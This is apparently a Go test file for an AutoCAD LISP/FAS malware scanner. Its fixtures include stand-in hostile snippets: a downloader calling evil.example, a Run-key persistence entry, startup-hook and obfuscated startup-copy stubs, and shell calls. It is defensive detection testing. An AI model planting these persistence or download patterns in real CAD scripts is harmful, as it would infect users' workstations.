package analyzer

import (
	"bytes"
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/evilcad/cadscanner/pkg/config"
	"github.com/evilcad/cadscanner/pkg/ir"
)

// TestMultiFileIsolation verifies that the same Analyzer can analyze multiple
// files sequentially without state pollution (Phase 1 requirement).
func TestMultiFileIsolation(t *testing.T) {
	cfg, _ := config.Load("")
	a, err := New(cfg)
	if err != nil {
		t.Fatalf("failed to create analyzer: %v", err)
	}

	// Create two temporary LSP files with different function names
	tmpDir := t.TempDir()

	file1 := filepath.Join(tmpDir, "test1.lsp")
	content1 := "(defun func-a () (print \"hello\"))"
	if err := os.WriteFile(file1, []byte(content1), 0644); err != nil {
		t.Fatalf("failed to write file1: %v", err)
	}

	file2 := filepath.Join(tmpDir, "test2.lsp")
	content2 := "(defun func-b () (print \"world\"))"
	if err := os.WriteFile(file2, []byte(content2), 0644); err != nil {
		t.Fatalf("failed to write file2: %v", err)
	}

	// Analyze first file
	result1, err := a.AnalyzeFile(context.Background(), file1, false)
	if err != nil {
		t.Fatalf("failed to analyze file1: %v", err)
	}

	// Verify first result has func-a and not func-b
	if _, ok := result1.IRFunctions["func-a"]; !ok {
		t.Errorf("result1 should contain func-a")
	}
	if _, ok := result1.IRFunctions["func-b"]; ok {
		t.Errorf("result1 should NOT contain func-b (isolation failure)")
	}

	// Analyze second file
	result2, err := a.AnalyzeFile(context.Background(), file2, false)
	if err != nil {
		t.Fatalf("failed to analyze file2: %v", err)
	}

	// Verify second result has func-b and not func-a (no residue from file1)
	if _, ok := result2.IRFunctions["func-b"]; !ok {
		t.Errorf("result2 should contain func-b")
	}
	if _, ok := result2.IRFunctions["func-a"]; ok {
		t.Errorf("result2 should NOT contain func-a from previous analysis (state pollution!)")
	}

	// Verify SSA counters, effects don't accumulate
	if len(result1.AllEffects) != len(result2.AllEffects) {
		t.Logf("note: different effect counts (expected for different inputs): %d vs %d",
			len(result1.AllEffects), len(result2.AllEffects))
	}
}

// TestJSONFieldCompatibility verifies that all expected JSON fields exist and
// have the correct structure (Phase 4 requirement).
func TestJSONFieldCompatibility(t *testing.T) {
	cfg, _ := config.Load("")
	a, err := New(cfg)
	if err != nil {
		t.Fatalf("failed to create analyzer: %v", err)
	}

	// Create a simple test file
	tmpDir := t.TempDir()
	file := filepath.Join(tmpDir, "test.lsp")
	content := `(defun malicious-func ()
  (write-line "suspicious" "C:\\test.txt")
  (shell "calc.exe"))`
	if err := os.WriteFile(file, []byte(content), 0644); err != nil {
		t.Fatalf("failed to write test file: %v", err)
	}

	result, err := a.AnalyzeFile(context.Background(), file, false)
	if err != nil {
		t.Fatalf("failed to analyze file: %v", err)
	}

	// Marshal to JSON
	data, err := json.Marshal(result)
	if err != nil {
		t.Fatalf("failed to marshal JSON: %v", err)
	}

	// Unmarshal to generic map for field existence check
	var jsonMap map[string]interface{}
	if err := json.Unmarshal(data, &jsonMap); err != nil {
		t.Fatalf("failed to unmarshal JSON: %v", err)
	}

	// Required top-level fields per compatibility contract
	requiredFields := []string{
		"Filepath",
		"InputType",
		"IsMalicious",
		"MaliciousConfidence",
		"RiskScore",
		"ASTCount",
		"NormalizedCount",
		"IRFunctions",
		"AllEffects",
		"LiftedEffects",
		"FunctionSummaries",
		"InferredBehaviors",
		"SCCResults",
		"PropagationClosures",
		"Motifs",
		"FormalScoreResult",
		"PredicateResults",
		"AttackResult",
		"MatchedRules",
		"ScoreResult",
		"LLMEncoding",
		"ObfuscationPatterns",
		"SynthesizedBehaviors", // compatibility field
		"FASMeta",
		"VLXMeta",
	}

	for _, field := range requiredFields {
		if _, ok := jsonMap[field]; !ok {
			t.Errorf("required JSON field missing: %s", field)
		}
	}
}

func TestFASMetadataSurvivesAnalyzerPipeline(t *testing.T) {
	cfg, _ := config.Load("")
	a, err := New(cfg)
	if err != nil {
		t.Fatalf("failed to create analyzer: %v", err)
	}

	tmpDir := t.TempDir()
	file := filepath.Join(tmpDir, "sample.fas")
	if err := os.WriteFile(file, buildTestFASFile(), 0644); err != nil {
		t.Fatalf("failed to write test fas file: %v", err)
	}

	result, err := a.AnalyzeFile(context.Background(), file, false)
	if err != nil {
		t.Fatalf("failed to analyze fas file: %v", err)
	}

	if result.InputType != "fas" {
		t.Fatalf("expected fas input type, got %q", result.InputType)
	}
	if result.FASMeta == nil {
		t.Fatal("expected FAS metadata to be preserved")
	}
	if _, ok := result.FASMeta["resource_summary"]; !ok {
		t.Fatalf("expected conservative resource_summary in FAS metadata, got %v", result.FASMeta)
	}
	for _, legacyKey := range []string{"urls", "com_objects", "commands", "registry_keys", "file_paths", "string_count", "symbol_count"} {
		if _, ok := result.FASMeta[legacyKey]; ok {
			t.Fatalf("did not expect legacy top-level FAS metadata key %q, got %v", legacyKey, result.FASMeta[legacyKey])
		}
	}
	if _, ok := result.FASMeta["behavior"]; ok {
		t.Fatalf("did not expect legacy behavior field in FAS metadata, got %v", result.FASMeta["behavior"])
	}
	if _, ok := result.FASMeta["recovered_functions"]; !ok {
		t.Fatalf("expected recovered_functions in FAS metadata, got %v", result.FASMeta)
	}
	if _, ok := result.FASMeta["recovered_call_graph"]; ok {
		t.Fatalf("did not expect recovered_call_graph in cleaned FAS metadata, got %v", result.FASMeta["recovered_call_graph"])
	}

	recoveredFunctions, ok := result.FASMeta["recovered_functions"].([]map[string]interface{})
	if !ok {
		t.Fatalf("expected recovered_functions as []map[string]interface{}, got %T", result.FASMeta["recovered_functions"])
	}
	if len(recoveredFunctions) != 1 {
		t.Fatalf("expected exactly one recovered function, got %d", len(recoveredFunctions))
	}
	if recoveredFunctions[0]["name"] != "entry-fn" {
		t.Fatalf("expected recovered function name entry-fn, got %v", recoveredFunctions[0]["name"])
	}
}

func TestRecoveredFASFunctionsMergeIntoIR(t *testing.T) {
	cfg, _ := config.Load("")
	a, err := New(cfg)
	if err != nil {
		t.Fatalf("failed to create analyzer: %v", err)
	}

	tmpDir := t.TempDir()
	file := filepath.Join(tmpDir, "callgraph.fas")
	if err := os.WriteFile(file, buildCallGraphTestFASFile(), 0644); err != nil {
		t.Fatalf("failed to write callgraph fas file: %v", err)
	}

	result, err := a.AnalyzeFile(context.Background(), file, false)
	if err != nil {
		t.Fatalf("failed to analyze fas file: %v", err)
	}

	if _, ok := result.IRFunctions["caller-fn"]; !ok {
		t.Fatalf("expected recovered caller-fn in IR functions, got %v", keysOf(result.IRFunctions))
	}
	if _, ok := result.IRFunctions["callee-fn"]; !ok {
		t.Fatalf("expected recovered callee-fn in IR functions, got %v", keysOf(result.IRFunctions))
	}
	summary, ok := result.FunctionSummaries["caller-fn"]
	if !ok {
		t.Fatalf("expected caller-fn function summary, got %v", keysOfSummaries(result.FunctionSummaries))
	}
	if len(summary.Calls) != 1 || summary.Calls[0] != "callee-fn" {
		t.Fatalf("expected caller-fn to call callee-fn, got %v", summary.Calls)
	}
}

func TestRecoveredFASBindingsMergeIntoIR(t *testing.T) {
	cfg, _ := config.Load("")
	a, err := New(cfg)
	if err != nil {
		t.Fatalf("failed to create analyzer: %v", err)
	}

	tmpDir := t.TempDir()
	file := filepath.Join(tmpDir, "bindings.fas")
	if err := os.WriteFile(file, buildBindingTestFASFile(), 0644); err != nil {
		t.Fatalf("failed to write binding fas file: %v", err)
	}

	result, err := a.AnalyzeFile(context.Background(), file, false)
	if err != nil {
		t.Fatalf("failed to analyze fas file: %v", err)
	}

	toplevelAny, ok := result.IRFunctions["__toplevel__"]
	if !ok {
		t.Fatalf("expected __toplevel__ in IR functions, got %v", keysOf(result.IRFunctions))
	}
	toplevel, ok := toplevelAny.(*ir.IRFunction)
	if !ok {
		t.Fatalf("expected __toplevel__ IR function type, got %T", toplevelAny)
	}
	if got := findAssignValue(toplevel, "alias-fn"); got != "helper-fn" {
		t.Fatalf("expected recovered global binding alias-fn=helper-fn, got %q", got)
	}

	callerAny, ok := result.IRFunctions["caller-fn"]
	if !ok {
		t.Fatalf("expected caller-fn in IR functions, got %v", keysOf(result.IRFunctions))
	}
	caller, ok := callerAny.(*ir.IRFunction)
	if !ok {
		t.Fatalf("expected caller-fn IR function type, got %T", callerAny)
	}
	if got := findAssignValue(caller, "local_0"); got != "helper-fn" {
		t.Fatalf("expected recovered slot binding local_0=helper-fn, got %q", got)
	}
}

func TestRecoveredFASIndirectCallsMergeIntoIR(t *testing.T) {
	cfg, _ := config.Load("")
	a, err := New(cfg)
	if err != nil {
		t.Fatalf("failed to create analyzer: %v", err)
	}

	tmpDir := t.TempDir()
	file := filepath.Join(tmpDir, "indirect.fas")
	if err := os.WriteFile(file, buildIndirectCallTestFASFile(), 0644); err != nil {
		t.Fatalf("failed to write indirect fas file: %v", err)
	}

	result, err := a.AnalyzeFile(context.Background(), file, false)
	if err != nil {
		t.Fatalf("failed to analyze fas file: %v", err)
	}

	callerAny, ok := result.IRFunctions["caller-fn"]
	if !ok {
		t.Fatalf("expected caller-fn in IR functions, got %v", keysOf(result.IRFunctions))
	}
	caller, ok := callerAny.(*ir.IRFunction)
	if !ok {
		t.Fatalf("expected caller-fn IR function type, got %T", callerAny)
	}

	foundIndirect := false
	for _, block := range caller.Blocks {
		for _, instr := range block.Instructions {
			if instr.Opcode != ir.CALL || len(instr.Operands) == 0 {
				continue
			}
			callee, _ := instr.Operands[0].(string)
			if callee == "helper-fn" && instr.Metadata["recovered_indirect"] == true {
				foundIndirect = true
			}
		}
	}
	if !foundIndirect {
		t.Fatalf("expected recovered indirect call metadata in caller-fn, got %+v", caller.Blocks)
	}
}

func TestRecoveredFASCFGMergeIntoIRBlocks(t *testing.T) {
	cfg, _ := config.Load("")
	a, err := New(cfg)
	if err != nil {
		t.Fatalf("failed to create analyzer: %v", err)
	}

	tmpDir := t.TempDir()
	file := filepath.Join(tmpDir, "cfg.fas")
	if err := os.WriteFile(file, buildCFGTestFASFile(), 0644); err != nil {
		t.Fatalf("failed to write cfg fas file: %v", err)
	}

	result, err := a.AnalyzeFile(context.Background(), file, false)
	if err != nil {
		t.Fatalf("failed to analyze fas file: %v", err)
	}

	fnAny, ok := result.IRFunctions["branch-fn"]
	if !ok {
		t.Fatalf("expected branch-fn in IR functions, got %v", keysOf(result.IRFunctions))
	}
	fn, ok := fnAny.(*ir.IRFunction)
	if !ok {
		t.Fatalf("expected branch-fn IR function type, got %T", fnAny)
	}
	if fn.EntryBlock != "block_0004" {
		t.Fatalf("expected recovered entry block block_0004, got %q", fn.EntryBlock)
	}
	entry := fn.Blocks["block_000A"]
	if entry == nil {
		t.Fatalf("expected recovered branch block block_000A, got %+v", fn.Blocks)
	}
	if !containsString(entry.Successors, "block_0010") || !containsString(entry.Successors, "block_000D") {
		t.Fatalf("expected branch successors block_0010 and block_000D, got %v", entry.Successors)
	}
}

func TestRecoveredFASFunctionMetadataMergeIntoIR(t *testing.T) {
	cfg, _ := config.Load("")
	a, err := New(cfg)
	if err != nil {
		t.Fatalf("failed to create analyzer: %v", err)
	}

	tmpDir := t.TempDir()
	file := filepath.Join(tmpDir, "metadata.fas")
	if err := os.WriteFile(file, buildRecoveredFunctionMetadataFASFile(), 0644); err != nil {
		t.Fatalf("failed to write metadata fas file: %v", err)
	}

	result, err := a.AnalyzeFile(context.Background(), file, false)
	if err != nil {
		t.Fatalf("failed to analyze fas file: %v", err)
	}

	fnAny, ok := result.IRFunctions["meta-fn"]
	if !ok {
		t.Fatalf("expected meta-fn in IR functions, got %v", keysOf(result.IRFunctions))
	}
	fn, ok := fnAny.(*ir.IRFunction)
	if !ok {
		t.Fatalf("expected meta-fn IR function type, got %T", fnAny)
	}
	if fn.Metadata["recovered_from"] != "fas" {
		t.Fatalf("expected recovered_from=fas, got %v", fn.Metadata["recovered_from"])
	}
	if fn.Metadata["recovered_kind"] != "func" {
		t.Fatalf("expected recovered_kind=func, got %v", fn.Metadata["recovered_kind"])
	}
	if fn.Metadata["recovered_num_args"] != 1 {
		t.Fatalf("expected recovered_num_args=1, got %v", fn.Metadata["recovered_num_args"])
	}
	if fn.Metadata["recovered_flags"] != 7 {
		t.Fatalf("expected recovered_flags=7, got %v", fn.Metadata["recovered_flags"])
	}
	if fn.Metadata["recovered_is_lambda"] != true {
		t.Fatalf("expected recovered_is_lambda=true, got %v", fn.Metadata["recovered_is_lambda"])
	}
}

func buildTestFASFile() []byte {
	stream1 := []byte{
		0x00, 0x00, 0x00, 0x00,
		0x51, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x16,
	}
	stream2 := append([]byte{0x00, 0x00, 0x00, 0x00}, []byte("entry-fn\x00")...)

	var fas bytes.Buffer
	fas.WriteString("FAS4-FILE ; Do not change it!\r\n")
	fas.WriteString("11 0$")
	fas.Write(stream1)
	fas.WriteByte('$')
	fas.WriteString("\r\n13 0$")
	fas.Write(stream2)
	fas.WriteByte('$')
	return fas.Bytes()
}

func buildCallGraphTestFASFile() []byte {
	stream1 := []byte{
		0x00, 0x00, 0x00, 0x00,
		0x51, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x35, 0x00, 0x01, 0x00, 0x00,
		0x16,
		0x51, 0x00, 0x01, 0x00, 0x00, 0x00,
		0x16,
	}
	stream2 := append([]byte{0x00, 0x00, 0x00, 0x00}, []byte("caller-fn\x00callee-fn\x00")...)

	var fas bytes.Buffer
	fas.WriteString("FAS4-FILE ; Do not change it!\r\n")
	fas.WriteString("23 0$")
	fas.Write(stream1)
	fas.WriteByte('$')
	fas.WriteString("\r\n24 0$")
	fas.Write(stream2)
	fas.WriteByte('$')
	return fas.Bytes()
}

func buildBindingTestFASFile() []byte {
	stream1 := []byte{
		0x00, 0x00, 0x00, 0x00,
		0x03, 0x01, 0x00,
		0x06, 0x00, 0x00,
		0x51, 0x00, 0x02, 0x00, 0x00, 0x00,
		0x03, 0x01, 0x00,
		0x5D, 0x00, 0x00,
		0x16,
	}
	stream2 := append([]byte{0x00, 0x00, 0x00, 0x00}, []byte("alias-fn\x00helper-fn\x00caller-fn\x00")...)

	var fas bytes.Buffer
	fas.WriteString("FAS4-FILE ; Do not change it!\r\n")
	fas.WriteString("23 0$")
	fas.Write(stream1)
	fas.WriteByte('$')
	fas.WriteString("\r\n33 0$")
	fas.Write(stream2)
	fas.WriteByte('$')
	return fas.Bytes()
}

func buildIndirectCallTestFASFile() []byte {
	stream1 := []byte{
		0x00, 0x00, 0x00, 0x00,
		0x51, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x03, 0x01, 0x00,
		0x2E, 0x00,
		0x16,
	}
	stream2 := append([]byte{0x00, 0x00, 0x00, 0x00}, []byte("caller-fn\x00helper-fn\x00")...)

	var fas bytes.Buffer
	fas.WriteString("FAS4-FILE ; Do not change it!\r\n")
	fas.WriteString("16 0$")
	fas.Write(stream1)
	fas.WriteByte('$')
	fas.WriteString("\r\n24 0$")
	fas.Write(stream2)
	fas.WriteByte('$')
	return fas.Bytes()
}

func buildCFGTestFASFile() []byte {
	stream1 := []byte{
		0x00, 0x00, 0x00, 0x00,
		0x51, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x0D, 0x03, 0x00,
		0x01,
		0x16,
		0x02,
		0x16,
	}
	stream2 := append([]byte{0x00, 0x00, 0x00, 0x00}, []byte("branch-fn\x00")...)

	var fas bytes.Buffer
	fas.WriteString("FAS4-FILE ; Do not change it!\r\n")
	fas.WriteString("17 0$")
	fas.Write(stream1)
	fas.WriteByte('$')
	fas.WriteString("\r\n14 0$")
	fas.Write(stream2)
	fas.WriteByte('$')
	return fas.Bytes()
}

func buildRecoveredFunctionMetadataFASFile() []byte {
	stream1 := []byte{
		0x00, 0x00, 0x00, 0x00,
		0x51, 0x01, 0x00, 0x00, 0x07, 0x00,
		0x16,
	}
	stream2 := append([]byte{0x00, 0x00, 0x00, 0x00}, []byte("meta-fn\x00")...)

	var fas bytes.Buffer
	fas.WriteString("FAS4-FILE ; Do not change it!\r\n")
	fas.WriteString("11 0$")
	fas.Write(stream1)
	fas.WriteByte('$')
	fas.WriteString("\r\n12 0$")
	fas.Write(stream2)
	fas.WriteByte('$')
	return fas.Bytes()
}

func keysOf(m map[string]interface{}) []string {
	keys := make([]string, 0, len(m))
	for k := range m {
		keys = append(keys, k)
	}
	return keys
}

func keysOfSummaries(m map[string]*ir.FunctionSummary) []string {
	keys := make([]string, 0, len(m))
	for k := range m {
		keys = append(keys, k)
	}
	return keys
}

func findAssignValue(fn *ir.IRFunction, name string) string {
	if fn == nil {
		return ""
	}
	for _, block := range fn.Blocks {
		for _, instr := range block.Instructions {
			if instr.Opcode != ir.ASSIGN || instr.Result != name || len(instr.Operands) == 0 {
				continue
			}
			if value, ok := instr.Operands[0].(string); ok {
				return value
			}
		}
	}
	return ""
}

func containsString(values []string, want string) bool {
	for _, value := range values {
		if value == want {
			return true
		}
	}
	return false
}

// TestPipelineConnectivity verifies that all pipeline stages produce valid
// outputs without panic (Phase 3 requirement).
func TestPipelineConnectivity(t *testing.T) {
	cfg, _ := config.Load("")
	a, err := New(cfg)
	if err != nil {
		t.Fatalf("failed to create analyzer: %v", err)
	}

	tmpDir := t.TempDir()
	file := filepath.Join(tmpDir, "test.lsp")
	content := `(defun test-func ()
  (if (file-exists-p "malicious.txt")
    (progn
      (delete-file "target.txt")
      (write-line "infected" "C:\\Windows\\test.txt"))))`
	if err := os.WriteFile(file, []byte(content), 0644); err != nil {
		t.Fatalf("failed to write test file: %v", err)
	}

	result, err := a.AnalyzeFile(context.Background(), file, false)
	if err != nil {
		t.Fatalf("failed to analyze: %v", err)
	}

	// All these should be non-nil (even if empty, should not panic)
	assertNotNil(t, "LiftedEffects", result.LiftedEffects)
	assertNotNil(t, "FunctionSummaries", result.FunctionSummaries)
	assertNotNil(t, "SCCResults", result.SCCResults)
	assertNotNil(t, "PropagationClosures", result.PropagationClosures)
	assertNotNil(t, "Motifs", result.Motifs)
	assertNotNil(t, "FormalScoreResult", result.FormalScoreResult)
	assertNotNil(t, "PredicateResults", result.PredicateResults)
	assertNotNil(t, "ScoreResult", result.ScoreResult)
	// LLMEncoding can be empty string but should not panic
	// SynthesizedBehaviors should exist for compatibility
	assertNotNil(t, "SynthesizedBehaviors", result.SynthesizedBehaviors)
}

func assertNotNil(t *testing.T, name string, value interface{}) {
	if value == nil {
		t.Errorf("%s should not be nil", name)
	}
}

// TestCallGraphConsistency verifies that the same call graph is used across
// interprocedural, formal, and motif analysis (Phase 2 requirement).
func TestCallGraphConsistency(t *testing.T) {
	cfg, _ := config.Load("")
	a, err := New(cfg)
	if err != nil {
		t.Fatalf("failed to create analyzer: %v", err)
	}

	tmpDir := t.TempDir()
	file := filepath.Join(tmpDir, "test.lsp")
	// Create a file with mutual recursion
	content := `(defun func-a ()
  (func-b)
  (print "a"))
(defun func-b ()
  (func-a)
  (print "b"))`
	if err := os.WriteFile(file, []byte(content), 0644); err != nil {
		t.Fatalf("failed to write test file: %v", err)
	}

	result, err := a.AnalyzeFile(context.Background(), file, false)
	if err != nil {
		t.Fatalf("failed to analyze: %v", err)
	}

	// SCC detection should have found the cycle between a and b
	foundCycle := false
	for _, scc := range result.SCCResults {
		if len(scc.Nodes) >= 2 {
			foundCycle = true
			t.Logf("Found SCC with nodes: %v", scc.Nodes)
		}
	}
	if !foundCycle {
		t.Errorf("expected to find SCC cycle for mutually recursive functions")
	}

	// Motifs should have been extracted using the same call graph
	if len(result.Motifs) == 0 {
		t.Logf("No motifs found (may be OK depending on motif rules)")
	}
}

func TestVersionedStartupCopyScoresMalicious(t *testing.T) {
	cfg, _ := config.Load("")
	a, err := New(cfg)
	if err != nil {
		t.Fatalf("failed to create analyzer: %v", err)
	}

	tmpDir := t.TempDir()
	file := filepath.Join(tmpDir, "versioned-startup.lsp")
	content := `(vl-file-copy "acad2000.fas" "acad2000.lsp")`
	if err := os.WriteFile(file, []byte(content), 0644); err != nil {
		t.Fatalf("failed to write test file: %v", err)
	}

	result, err := a.AnalyzeFile(context.Background(), file, false)
	if err != nil {
		t.Fatalf("failed to analyze: %v", err)
	}

	if !result.IsMalicious {
		t.Fatalf("expected versioned startup copy to be malicious, got score %.4f", result.RiskScore)
	}
}

func TestVersionedStartupLoadProducesAttackEvidence(t *testing.T) {
	cfg, _ := config.Load("")
	a, err := New(cfg)
	if err != nil {
		t.Fatalf("failed to create analyzer: %v", err)
	}

	tmpDir := t.TempDir()
	file := filepath.Join(tmpDir, "acad2006.lsp")
	content := `(if (not (= (substr (ver) 1 11) "Visual LISP")) (load "acad2006doc.lsp"))`
	if err := os.WriteFile(file, []byte(content), 0644); err != nil {
		t.Fatalf("failed to write test file: %v", err)
	}

	result, err := a.AnalyzeFile(context.Background(), file, false)
	if err != nil {
		t.Fatalf("failed to analyze: %v", err)
	}

	foundLoadRead := false
	for _, effect := range result.AllEffects {
		if effect.EffectType == "file_read" && strings.EqualFold(effect.Source, "load") &&
			strings.Contains(strings.ToLower(effect.Target), "acad2006doc.lsp") {
			foundLoadRead = true
			break
		}
	}
	if !foundLoadRead {
		t.Fatalf("expected load to produce file_read effect for acad2006doc.lsp, got %+v", result.AllEffects)
	}

	if result.AttackResult == nil || len(result.AttackResult.Techniques) == 0 {
		t.Fatalf("expected versioned startup load to produce ATT&CK techniques")
	}

	foundRule := false
	for _, rule := range result.MatchedRules {
		if rule.ID == "STARTUP_LOAD_001" {
			foundRule = true
			break
		}
	}
	if !foundRule {
		t.Fatalf("expected STARTUP_LOAD_001 for startup-chain load, got %+v", result.MatchedRules)
	}
	if !result.IsMalicious {
		t.Fatalf("expected startup-chain load stub to be malicious, got score %.4f", result.RiskScore)
	}
}

func TestBenignCustomCommandIsNotCommandHijack(t *testing.T) {
	cfg, _ := config.Load("")
	a, err := New(cfg)
	if err != nil {
		t.Fatalf("failed to create analyzer: %v", err)
	}

	tmpDir := t.TempDir()
	file := filepath.Join(tmpDir, "bak.lsp")
	content := `(defun C:BAK (/ bakPath)
  (setq bakPath "backup.bak")
  (vl-file-copy "drawing.dwg" bakPath)
  (princ))`
	if err := os.WriteFile(file, []byte(content), 0644); err != nil {
		t.Fatalf("failed to write test file: %v", err)
	}

	result, err := a.AnalyzeFile(context.Background(), file, false)
	if err != nil {
		t.Fatalf("failed to analyze: %v", err)
	}

	if result.AttackResult != nil {
		for _, tech := range result.AttackResult.Techniques {
			if tech.ID == "T1569" {
				t.Fatalf("benign custom command should not be tagged as T1569")
			}
		}
	}
}

func TestNetworkDownloadScoresMalicious(t *testing.T) {
	cfg, _ := config.Load("")
	a, err := New(cfg)
	if err != nil {
		t.Fatalf("failed to create analyzer: %v", err)
	}

	tmpDir := t.TempDir()
	file := filepath.Join(tmpDir, "netdrop.lsp")
	content := `(defun dl ()
  (vl-load-com)
  (~ "http://evil.example/payload" ".dcl"))`
	if err := os.WriteFile(file, []byte(content), 0644); err != nil {
		t.Fatalf("failed to write test file: %v", err)
	}

	result, err := a.AnalyzeFile(context.Background(), file, false)
	if err != nil {
		t.Fatalf("failed to analyze: %v", err)
	}

	if result.RiskScore <= 0.5 {
		t.Fatalf("expected network downloader to score malicious, got %.4f", result.RiskScore)
	}
}

func TestStartupHookScoresMalicious(t *testing.T) {
	cfg, _ := config.Load("")
	a, err := New(cfg)
	if err != nil {
		t.Fatalf("failed to create analyzer: %v", err)
	}

	tmpDir := t.TempDir()
	file := filepath.Join(tmpDir, "startup_hook.lsp")
	content := `(defun s::startup () (princ))
(setvar "acadlspasdoc" 1)`
	if err := os.WriteFile(file, []byte(content), 0644); err != nil {
		t.Fatalf("failed to write test file: %v", err)
	}

	result, err := a.AnalyzeFile(context.Background(), file, false)
	if err != nil {
		t.Fatalf("failed to analyze: %v", err)
	}
	if !result.IsMalicious {
		t.Fatalf("expected startup hook to be malicious, got %.4f", result.RiskScore)
	}
}

func TestFileSystemObjectOnlyStaysBenign(t *testing.T) {
	cfg, _ := config.Load("")
	a, err := New(cfg)
	if err != nil {
		t.Fatalf("failed to create analyzer: %v", err)
	}

	file := createTestLSP(t, "read_csv.lsp", `(defun read-csv ()
  (vl-load-com)
  (vlax-create-object "Scripting.FileSystemObject")
  (princ))`)

	result, err := a.AnalyzeFile(context.Background(), file, false)
	if err != nil {
		t.Fatalf("failed to analyze: %v", err)
	}

	if result.IsMalicious {
		t.Fatalf("filesystemobject-only sample should stay benign, got %.4f", result.RiskScore)
	}
}

func TestVendorRegistryAndLicensePowerShellStayBenign(t *testing.T) {
	cfg, _ := config.Load("")
	a, err := New(cfg)
	if err != nil {
		t.Fatalf("failed to create analyzer: %v", err)
	}

	file := createTestLSP(t, "license.lsp", `(defun license-flow ()
  (vl-registry-write "HKEY_CURRENT_USER\\Software\\RebarPro" "Owner" "demo")
  (startapp "powershell" "-Command \"$id = (Get-WmiObject Win32_ComputerSystemProduct).UUID; $id | Out-File C:\\\\temp\\\\id.txt\"")
  (princ))`)

	result, err := a.AnalyzeFile(context.Background(), file, false)
	if err != nil {
		t.Fatalf("failed to analyze: %v", err)
	}

	if result.IsMalicious {
		t.Fatalf("license-style registry and PowerShell should stay benign, got %.4f", result.RiskScore)
	}
}

func TestRunKeyRegistryStillScoresMalicious(t *testing.T) {
	cfg, _ := config.Load("")
	a, err := New(cfg)
	if err != nil {
		t.Fatalf("failed to create analyzer: %v", err)
	}

	file := createTestLSP(t, "runkey.lsp", `(defun persist ()
  (vl-registry-write "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" "CADUpdater" "C:\\\\Users\\\\Public\\\\evil.exe")
  (princ))`)

	result, err := a.AnalyzeFile(context.Background(), file, false)
	if err != nil {
		t.Fatalf("failed to analyze: %v", err)
	}

	if !result.IsMalicious {
		t.Fatalf("run key persistence should remain malicious, got %.4f", result.RiskScore)
	}
}

func TestEmbeddedStartupCopyStringScoresMalicious(t *testing.T) {
	cfg, _ := config.Load("")
	a, err := New(cfg)
	if err != nil {
		t.Fatalf("failed to create analyzer: %v", err)
	}

	file := createTestLSP(t, "embedded_copy.lsp", `(if "(vl-file-copy(findfile(vl-list->string'(108 111 103 111 46 103 105 102)))(vl-list->string'(97 99 97 100 46 118 108 120)))" acad.vlx_block_0466 acad.vlx_block_0417)`)

	result, err := a.AnalyzeFile(context.Background(), file, false)
	if err != nil {
		t.Fatalf("failed to analyze: %v", err)
	}

	foundRule := false
	for _, rule := range result.MatchedRules {
		if rule.ID == "STARTUP_COPY_STR_001" {
			foundRule = true
			break
		}
	}
	if !foundRule {
		t.Fatalf("expected STARTUP_COPY_STR_001, got %+v", result.MatchedRules)
	}
	if !result.IsMalicious {
		t.Fatalf("expected embedded startup copy string to score malicious, got %.4f", result.RiskScore)
	}
}

// TestContextScoreCompleteness verifies that context score uses real
// semantic tags and env checks, not empty placeholders (Phase 3 requirement).
func TestContextScoreCompleteness(t *testing.T) {
	cfg, _ := config.Load("")
	a, err := New(cfg)
	if err != nil {
		t.Fatalf("failed to create analyzer: %v", err)
	}

	tmpDir := t.TempDir()
	file := filepath.Join(tmpDir, "test.lsp")
	// File with environment checks
	content := `(defun check-and-act ()
  (if (file-exists-p "C:\\Windows\\System32")
    (progn
      (shell "whoami")
      (write-line "data" "C:\\temp\\out.txt"))))`
	if err := os.WriteFile(file, []byte(content), 0644); err != nil {
		t.Fatalf("failed to write test file: %v", err)
	}

	result, err := a.AnalyzeFile(context.Background(), file, false)
	if err != nil {
		t.Fatalf("failed to analyze: %v", err)
	}

	// Verify ScoreResult has ContextScore
	if result.ScoreResult == nil {
		t.Fatalf("ScoreResult should not be nil")
	}
	if result.ScoreResult.ContextScore == nil {
		t.Fatalf("ContextScore should not be nil (must be calculated with real data)")
	}

	// Context score should have meaningful values (not all zeros)
	cs := result.ScoreResult.ContextScore
	t.Logf("ContextScore: EnvAwareness=%.2f, Persistence=%.2f, Execution=%.2f, Final=%.2f",
		cs.EnvAwareness, cs.Persistence, cs.Execution, cs.FinalScore)

	// The fact that we got here without panic means semantic tags and env checks
	// were properly generated and passed through the pipeline
}

// TestTextOutputFormat verifies that text output contains expected sections.
// This is a lightweight check that main.go outputText would work correctly.
func TestTextOutputFormat(t *testing.T) {
	cfg, _ := config.Load("")
	a, err := New(cfg)
	if err != nil {
		t.Fatalf("failed to create analyzer: %v", err)
	}

	tmpDir := t.TempDir()
	file := filepath.Join(tmpDir, "test.lsp")
	content := `(defun test () (print "hello"))`
	if err := os.WriteFile(file, []byte(content), 0644); err != nil {
		t.Fatalf("failed to write test file: %v", err)
	}

	result, err := a.AnalyzeFile(context.Background(), file, false)
	if err != nil {
		t.Fatalf("failed to analyze: %v", err)
	}

	// Check result has all fields needed for text output
	if result.Filepath == "" {
		t.Errorf("Filepath should not be empty")
	}
	if result.RiskScore < 0 || result.RiskScore > 1 {
		t.Errorf("RiskScore should be in [0,1]")
	}
	if result.MaliciousConfidence < 0 || result.MaliciousConfidence > 1 {
		t.Errorf("MaliciousConfidence should be in [0,1]")
	}
	if len(result.IRFunctions) == 0 {
		t.Errorf("IRFunctions should not be empty for this input")
	}
}

// BenchmarkAnalyzeFile measures analysis performance.
func BenchmarkAnalyzeFile(b *testing.B) {
	cfg, _ := config.Load("")
	a, err := New(cfg)
	if err != nil {
		b.Fatalf("failed to create analyzer: %v", err)
	}

	tmpDir := b.TempDir()
	file := filepath.Join(tmpDir, "test.lsp")
	content := `(defun fib (n)
  (if (< n 2)
    n
    (+ (fib (- n 1)) (fib (- n 2)))))
(defun main ()
  (print (fib 10))
  (write-line "result" "output.txt"))`
	if err := os.WriteFile(file, []byte(content), 0644); err != nil {
		b.Fatalf("failed to write test file: %v", err)
	}

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_, err := a.AnalyzeFile(context.Background(), file, false)
		if err != nil {
			b.Fatalf("failed to analyze: %v", err)
		}
	}
}

// createTestLSP creates a test LSP file with the given content
